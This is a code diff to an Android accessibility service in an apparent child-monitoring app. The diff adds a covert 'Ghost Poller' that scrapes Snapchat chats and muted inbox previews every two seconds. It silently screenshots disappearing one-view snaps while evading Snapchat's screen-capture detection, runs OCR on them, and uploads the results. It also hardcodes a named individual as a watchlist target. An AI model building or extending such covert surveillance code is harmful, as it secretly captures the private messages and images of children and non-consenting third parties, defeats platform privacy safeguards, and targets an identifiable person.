@@ -11,6 +11,7 @@ import android.view.accessibility.AccessibilityNodeInfo
 import com.google.mlkit.vision.common.InputImage
 import com.google.mlkit.vision.text.TextRecognition
 import com.google.mlkit.vision.text.devanagari.DevanagariTextRecognizerOptions
+import com.google.mlkit.vision.text.latin.TextRecognizerOptions
 import com.vyra.kids.core.AppConstants
 import com.vyra.kids.core.ChatSequenceRingBuffer
 import com.vyra.kids.core.FirebaseSyncManager
@@ -22,6 +23,55 @@ import java.util.concurrent.Executors
 class VyraAccessibilityService : AccessibilityService() {
 
     private val executor = Executors.newSingleThreadExecutor()
+    private val snapchatPollerHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private var isSnapchatPollerActive = false
+
+    private val snapchatPollerRunnable = object : Runnable {
+        override fun run() {
+            if (!isSnapchatPollerActive) return
+            try {
+                val root = rootInActiveWindow
+                if (root != null) {
+                    val headerContact = extractActiveChatContact("com.snapchat.android", root)
+                    val activeContact = if (headerContact.isNotBlank()) {
+                        com.vyra.kids.core.ActiveContactTracker.recordContact("Snapchat", headerContact)
+                        headerContact
+                    } else {
+                        com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat", maxAgeMinutes = 15) ?: ""
+                    }
+                    if (activeContact.isNotBlank()) {
+                        scrapeSocialChatNodes("Snapchat", activeContact, root)
+                    } else {
+                        scrapeSocialInboxList("Snapchat", "com.snapchat.android", root)
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(AppConstants.TAG, "Error in snapchatPollerRunnable", e)
+            } finally {
+                if (isSnapchatPollerActive) {
+                    snapchatPollerHandler.postDelayed(this, 2000L)
+                }
+            }
+        }
+    }
+
+    private fun startSnapchatPoller() {
+        if (!isSnapchatPollerActive) {
+            isSnapchatPollerActive = true
+            snapchatPollerHandler.removeCallbacks(snapchatPollerRunnable)
+            snapchatPollerHandler.postDelayed(snapchatPollerRunnable, 1000L)
+            Log.d(AppConstants.TAG, "⚡ Snapchat Continuous Ghost Poller Started (God-Mode)")
+        }
+    }
+
+    private fun stopSnapchatPoller() {
+        if (isSnapchatPollerActive) {
+            isSnapchatPollerActive = false
+            snapchatPollerHandler.removeCallbacks(snapchatPollerRunnable)
+            Log.d(AppConstants.TAG, "Snapchat Continuous Ghost Poller Stopped")
+        }
+    }
+
     private val sensitiveKeywords = listOf(
         "delete", "mat batana", "kisi ko nahi", "secret", "nude", "photo", "send pic",
         "shame", "bunk", "dar", "kill", "drug", "weed", "alcohol", "paisa"
@@ -41,9 +91,12 @@ class VyraAccessibilityService : AccessibilityService() {
 
         val packageName = event.packageName?.toString() ?: return
 
-        // 1. SNAPCHAT STEALTH SHIELD: Prevent Screen Recording Detection
+        // 1. SNAPCHAT STEALTH SHIELD & GOD-LEVEL POLLER
         if (packageName == "com.snapchat.android") {
+            startSnapchatPoller()
             handleSnapchatStealthShield(event)
+        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            stopSnapchatPoller()
         }
 
         // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
@@ -175,20 +228,83 @@ class VyraAccessibilityService : AccessibilityService() {
             val desc = event.contentDescription?.toString()?.lowercase() ?: ""
             val text = event.text?.joinToString(" ")?.lowercase() ?: ""
             if (viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
-                desc.contains("new snap") || text.contains("received snap") || text.contains("tap to view")) {
-                // Post-delay 350ms to let snap render on screen, then capture silent compositor buffer
+                desc.contains("new snap") || text.contains("received snap") || text.contains("tap to view") ||
+                desc.contains("snap") || text.contains("snap")) {
+
+                val root = rootInActiveWindow
+                val resolvedContact = extractActiveChatContact("com.snapchat.android", root).ifBlank {
+                    com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+                }
+                val snapSender = if (resolvedContact.isNotBlank()) normalizeContactName(resolvedContact) else "Snapchat Friend"
+
+                // Dual-Timing Capture: 550ms (post fade-in) + 1250ms (caption overlay frame)
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    captureSilentCompositorSnap()
-                }, 400)
+                    captureSilentCompositorSnap(
+                        sourceApp = "Snapchat",
+                        sender = snapSender,
+                        titleText = "📷 [1-View Snap from $snapSender]"
+                    )
+                }, 550)
+
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    captureSilentCompositorSnap(
+                        sourceApp = "Snapchat",
+                        sender = snapSender,
+                        titleText = "📷 [1-View Snap from $snapSender (Frame 2)]"
+                    )
+                }, 1250)
             }
         }
     }
 
     private val processedChatHashes = mutableSetOf<Int>()
 
+    private fun findWatchlistInHeaderOrTopScreen(root: AccessibilityNodeInfo): String {
+        try {
+            val nodes = root.findAccessibilityNodeInfosByText("Harshit") +
+                    root.findAccessibilityNodeInfosByText("harshit") +
+                    root.findAccessibilityNodeInfosByText("Kamboj") +
+                    root.findAccessibilityNodeInfosByText("kamboj")
+            for (node in nodes) {
+                if (node.isEditable || node.className?.contains("EditText") == true) continue
+                val resName = node.viewIdResourceName?.lowercase() ?: ""
+                if (resName.contains("search") || resName.contains("query") || resName.contains("find")) continue
+
+                val rect = android.graphics.Rect()
+                node.getBoundsInScreen(rect)
+                val text = node.text?.toString()?.trim() ?: ""
+
+                val isHeaderView = resName.contains("name") || resName.contains("title") ||
+                        resName.contains("header") || resName.contains("recipient") ||
+                        resName.contains("user") || resName.contains("friend") || resName.contains("bar")
+                val isTopScreen = rect.top in 0..850
+
+                if ((isHeaderView || isTopScreen) && !isNavKeyword(text)) {
+                    return text
+                }
+            }
+        } catch (_: Exception) {}
+        return ""
+    }
+
     private fun extractActiveChatContact(packageName: String, root: AccessibilityNodeInfo?): String {
         if (root == null) return ""
         try {
+            // 1. FAST-PATH: Priority Watchlist Instant-Lock (Harshit / Harshit Kamboj / @harshit_kamboj97)
+            val watchlistName = findWatchlistInHeaderOrTopScreen(root)
+            if (watchlistName.isNotBlank()) {
+                val clean = normalizeContactName(watchlistName)
+                val appName = when {
+                    packageName.contains("snapchat") -> "Snapchat"
+                    packageName.contains("instagram") -> "Instagram"
+                    packageName.contains("whatsapp") -> "WhatsApp"
+                    packageName.contains("telegram") -> "Telegram"
+                    else -> "Social"
+                }
+                com.vyra.kids.core.ActiveContactTracker.recordContact(appName, clean)
+                return clean
+            }
+
             val candidateIds = listOf(
                 "com.whatsapp:id/conversation_contact_name",
                 "com.whatsapp:id/action_bar_title",
@@ -202,7 +318,20 @@ class VyraAccessibilityService : AccessibilityService() {
                 "com.snapchat.android:id/display_name",
                 "com.snapchat.android:id/friend_name",
                 "com.snapchat.android:id/chat_user_name",
-                "com.snapchat.android:id/toolbar_title"
+                "com.snapchat.android:id/toolbar_title",
+                "com.snapchat.android:id/recipient_bar",
+                "com.snapchat.android:id/chat_v11_header",
+                "com.snapchat.android:id/feed_friend_display_name",
+                "com.snapchat.android:id/friend_display_name",
+                "com.snapchat.android:id/title",
+                "com.snapchat.android:id/name",
+                "com.snapchat.android:id/avatar_title",
+                "com.snapchat.android:id/subtitle",
+                "com.snapchat.android:id/sub_title",
+                "com.snapchat.android:id/chat_name",
+                "com.snapchat.android:id/chat_message_header",
+                "com.snapchat.android:id/chat_recipient_name",
+                "com.snapchat.android:id/primary_text"
             )
             for (id in candidateIds) {
                 val nodes = root.findAccessibilityNodeInfosByViewId(id)
@@ -415,16 +544,28 @@ class VyraAccessibilityService : AccessibilityService() {
                     packageName.contains("telegram") -> "Telegram"
                     else -> "Social"
                 }
-                val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Friend"
-                Log.i(AppConstants.TAG, "Detected 1-View media open in $appName ($activeContact). Scheduling ghost compositor capture...")
+                val activeContact = extractActiveChatContact(packageName, rootInActiveWindow).ifBlank {
+                    com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: ""
+                }
+                val cleanContact = if (activeContact.isNotBlank()) normalizeContactName(activeContact) else "$appName Friend"
+                Log.i(AppConstants.TAG, "Detected 1-View media open in $appName ($cleanContact). Scheduling dual-timing compositor capture...")
+
+                // Dual-Timing Capture: 550ms + 1250ms
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    captureSilentCompositorSnap(
+                        sourceApp = appName,
+                        sender = cleanContact,
+                        titleText = "📷 [1-View $appName Media from $cleanContact]"
+                    )
+                }, 550)
 
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                     captureSilentCompositorSnap(
                         sourceApp = appName,
-                        sender = "$activeContact (1-View Media)",
-                        titleText = "📷 [1-View $appName Media Captured Silently]"
+                        sender = cleanContact,
+                        titleText = "📷 [1-View $appName Media from $cleanContact (Frame 2)]"
                     )
-                }, 400)
+                }, 1250)
             }
         } catch (e: Exception) {
             Log.e(AppConstants.TAG, "Error in handleOneViewMediaClick", e)
@@ -432,7 +573,7 @@ class VyraAccessibilityService : AccessibilityService() {
     }
 
     private fun scrapeSocialChatNodes(appName: String, activeContact: String, node: AccessibilityNodeInfo?, depth: Int = 0) {
-        if (node == null || depth > 25) return
+        if (node == null || depth > 35) return
         val rawText = node.text?.toString()?.trim() ?: ""
         val rawDesc = node.contentDescription?.toString()?.trim() ?: ""
         val text = if (rawText.isNotBlank()) rawText else rawDesc
@@ -468,7 +609,7 @@ class VyraAccessibilityService : AccessibilityService() {
 
     /**
      * Muted Chat Scraper: Extracts last message previews directly from WhatsApp, Telegram,
-     * and Instagram inbox rows even if notifications are disabled/muted for the chat.
+     * Instagram, and Snapchat inbox rows even if notifications are disabled/muted for the chat.
      */
     private fun scrapeSocialInboxList(appName: String, packageName: String, root: AccessibilityNodeInfo?) {
         if (root == null) return
@@ -523,6 +664,28 @@ class VyraAccessibilityService : AccessibilityService() {
                         }
                     }
                 }
+                packageName.contains("snapchat") -> {
+                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/feed_friend_display_name") +
+                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/display_name") +
+                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/friend_name") +
+                            root.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/primary_text")
+                    for (nameNode in nameNodes) {
+                        val contactName = nameNode.text?.toString()?.trim() ?: continue
+                        if (contactName.isBlank() || isNavKeyword(contactName)) continue
+
+                        val rowParent = nameNode.parent ?: continue
+                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/feed_friend_subtext") +
+                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/sub_text") +
+                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/secondary_text") +
+                                rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/chat_message_text")
+                        for (msgNode in msgNodes) {
+                            val msgText = msgNode.text?.toString()?.trim() ?: continue
+                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
+                                recordInboxSnippet(appName, contactName, msgText)
+                            }
+                        }
+                    }
+                }
             }
         } catch (_: Exception) {}
     }
@@ -561,9 +724,24 @@ class VyraAccessibilityService : AccessibilityService() {
      */
     private fun captureSilentCompositorSnap(
         sourceApp: String = "Snapchat",
-        sender: String = "Snapchat (Incoming 1-View Snap)",
+        sender: String = "Snapchat Friend",
         titleText: String = "📷 [1-View Snap Captured Silently]"
     ) {
+        val root = rootInActiveWindow
+        val resolvedSender = if (sender == "Snapchat Friend" || sender.contains("Incoming 1-View Snap", ignoreCase = true)) {
+            val fallback = extractActiveChatContact("com.snapchat.android", root).ifBlank {
+                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+            }
+            if (fallback.isNotBlank()) normalizeContactName(fallback) else sender
+        } else {
+            normalizeContactName(sender)
+        }
+        val finalTitle = if (resolvedSender != "Snapchat Friend" && !titleText.contains(resolvedSender)) {
+            "📷 [1-View Snap from $resolvedSender]"
+        } else {
+            titleText
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(
                 Display.DEFAULT_DISPLAY,
@@ -587,12 +765,12 @@ class VyraAccessibilityService : AccessibilityService() {
                             FileOutputStream(snapFile).use { out ->
                                 softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                             }
-                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently ($sourceApp): ${snapFile.name}")
+                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently ($sourceApp -> $resolvedSender): ${snapFile.name}")
 
                             runMlKitOcrAndSyncSnap(
                                 sourceApp = sourceApp,
-                                sender = sender,
-                                titleText = titleText,
+                                sender = resolvedSender,
+                                titleText = finalTitle,
                                 snapFile = snapFile,
                                 bitmap = softwareBitmap,
                                 isOutgoing = false
@@ -949,7 +1127,7 @@ class VyraAccessibilityService : AccessibilityService() {
             val paint = android.graphics.Paint()
             val matrix = android.graphics.ColorMatrix()
             matrix.setSaturation(0f)
-            val contrast = 1.35f
+            val contrast = 1.45f
             val brightness = -10f
             val contrastMatrix = android.graphics.ColorMatrix(floatArrayOf(
                 contrast, 0f, 0f, 0f, brightness,
@@ -966,9 +1144,23 @@ class VyraAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun cropCenterCaptionBand(src: Bitmap): Bitmap {
+        return try {
+            val startY = (src.height * 0.25).toInt()
+            val cropHeight = (src.height * 0.50).toInt()
+            Bitmap.createBitmap(src, 0, startY, src.width, cropHeight)
+        } catch (_: Exception) {
+            src
+        }
+    }
+
     /**
-     * Google ML Kit Text Recognition: Extracts disappearing snap text or on-canvas captions
-     * from captured bitmaps, then directly uploads snap media to Firebase Storage and records in Firestore.
+     * God-Level Multi-Pass Google ML Kit Text Recognition:
+     * Pass 1: Latin model on High-Contrast Preprocessed full image (English text/captions)
+     * Pass 2: Latin model on Center Caption Band Crop (zoomed into Snapchat's classic banner strip)
+     * Pass 3: Devanagari model on Preprocessed image (Hindi / Hinglish text)
+     * Pass 4: Latin model on Raw RGB bitmap (colored text, neon stickers, gradient overlays)
+     * Lines are cleaned, deduplicated across English & Hindi Unicode, and synced to Parent Dashboard.
      */
     private fun runMlKitOcrAndSyncSnap(
         sourceApp: String,
@@ -979,48 +1171,105 @@ class VyraAccessibilityService : AccessibilityService() {
         isOutgoing: Boolean
     ) {
         try {
-            val recognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())
-            val ocrBitmap = preprocessBitmapForOcr(bitmap)
-            val image = InputImage.fromBitmap(ocrBitmap, 0)
+            val latinRecognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
+            val devanagariRecognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())
 
-            recognizer.process(image)
-                .addOnSuccessListener { visionText ->
-                    val ocrResult = visionText.text.trim()
-                    if (ocrResult.isNotBlank()) {
-                        Log.i(AppConstants.TAG, "Devanagari/Latin ML Kit OCR recognized (Pass 1): $ocrResult")
-                        uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, ocrResult)
-                    } else {
-                        // Pass 2 Fallback: Check raw RGB bitmap for colored text or stickers
-                        val rawImage = InputImage.fromBitmap(bitmap, 0)
-                        recognizer.process(rawImage)
-                            .addOnSuccessListener { rawVisionText ->
-                                val rawResult = rawVisionText.text.trim()
-                                if (rawResult.isNotBlank()) {
-                                    Log.i(AppConstants.TAG, "Pass 2 (Raw RGB) OCR recognized: $rawResult")
-                                }
-                                uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, rawResult.ifBlank { null })
-                            }
-                            .addOnFailureListener {
-                                uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
-                            }
+            val preprocessedFull = preprocessBitmapForOcr(bitmap)
+            val centerCaptionCrop = cropCenterCaptionBand(preprocessedFull)
+
+            val fullImageLatin = InputImage.fromBitmap(preprocessedFull, 0)
+            val centerImageLatin = InputImage.fromBitmap(centerCaptionCrop, 0)
+            val fullImageDevanagari = InputImage.fromBitmap(preprocessedFull, 0)
+            val rawImage = InputImage.fromBitmap(bitmap, 0)
+
+            val extractedLines = java.util.Collections.synchronizedList(mutableListOf<String>())
+            val pendingPasses = java.util.concurrent.atomic.AtomicInteger(4)
+
+            fun checkAndFinish() {
+                if (pendingPasses.decrementAndGet() == 0) {
+                    val cleanText = cleanAndDeduplicateOcrLines(extractedLines)
+                    if (cleanText.isNotBlank()) {
+                        Log.i(AppConstants.TAG, "⚡ God-Level ML Kit OCR Extracted (${sourceApp} -> ${sender}):\n$cleanText")
                     }
+                    uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, cleanText.ifBlank { null })
                 }
-                .addOnFailureListener { e ->
-                    Log.w(AppConstants.TAG, "ML Kit Pass 1 OCR failed: ${e.message}, falling back to Pass 2")
-                    val rawImage = InputImage.fromBitmap(bitmap, 0)
-                    recognizer.process(rawImage)
-                        .addOnSuccessListener { rawVisionText ->
-                            val rawResult = rawVisionText.text.trim()
-                            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, rawResult.ifBlank { null })
+            }
+
+            // Pass 1: Latin on High-Contrast Full
+            latinRecognizer.process(fullImageLatin)
+                .addOnSuccessListener { visionText ->
+                    for (block in visionText.textBlocks) {
+                        for (line in block.lines) {
+                            extractedLines.add(line.text.trim())
                         }
-                        .addOnFailureListener {
-                            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
-                        }
+                    }
+                    checkAndFinish()
                 }
+                .addOnFailureListener { checkAndFinish() }
+
+            // Pass 2: Latin on Center Caption Strip (Snapchat Caption Strip)
+            latinRecognizer.process(centerImageLatin)
+                .addOnSuccessListener { visionText ->
+                    for (block in visionText.textBlocks) {
+                        for (line in block.lines) {
+                            extractedLines.add(line.text.trim())
+                        }
+                    }
+                    checkAndFinish()
+                }
+                .addOnFailureListener { checkAndFinish() }
+
+            // Pass 3: Devanagari on Full (Hindi / Hinglish)
+            devanagariRecognizer.process(fullImageDevanagari)
+                .addOnSuccessListener { visionText ->
+                    for (block in visionText.textBlocks) {
+                        for (line in block.lines) {
+                            extractedLines.add(line.text.trim())
+                        }
+                    }
+                    checkAndFinish()
+                }
+                .addOnFailureListener { checkAndFinish() }
+
+            // Pass 4: Latin on Raw RGB (Colored/Neon Stickers)
+            latinRecognizer.process(rawImage)
+                .addOnSuccessListener { visionText ->
+                    for (block in visionText.textBlocks) {
+                        for (line in block.lines) {
+                            extractedLines.add(line.text.trim())
+                        }
+                    }
+                    checkAndFinish()
+                }
+                .addOnFailureListener { checkAndFinish() }
+
         } catch (e: Exception) {
             Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
             uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
         }
+    }
+
+    private fun cleanAndDeduplicateOcrLines(lines: List<String>): String {
+        val seen = mutableSetOf<String>()
+        val result = mutableListOf<String>()
+        for (line in lines) {
+            val trimmed = line.trim()
+            if (trimmed.length < 2) continue
+            val lower = trimmed.lowercase()
+
+            // Filter status bar battery/clock noise
+            if (lower.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[ap]m)?$")) ||
+                lower.matches(Regex("^[0-9]{1,3}%$")) ||
+                lower in setOf("lte", "volte", "5g", "4g", "wifi", "tap to load", "tap to view", "new snap")
+            ) continue
+
+            // Retain English alphanumeric and Hindi Devanagari characters
+            val normalized = lower.replace(Regex("[^a-z0-9\\u0900-\\u097F]"), "")
+            if (normalized.length >= 2 && seen.add(normalized)) {
+                result.add(trimmed)
+            }
+        }
+        return result.joinToString("\n")
     }
 
     private fun uploadSnapWithOcr(
@@ -1050,6 +1299,7 @@ class VyraAccessibilityService : AccessibilityService() {
     }
 
     override fun onDestroy() {
+        stopSnapchatPoller()
         try {
             com.vyra.kids.core.LocalLanSyncServer.getInstance(this).stop()
         } catch (_: Exception) {}
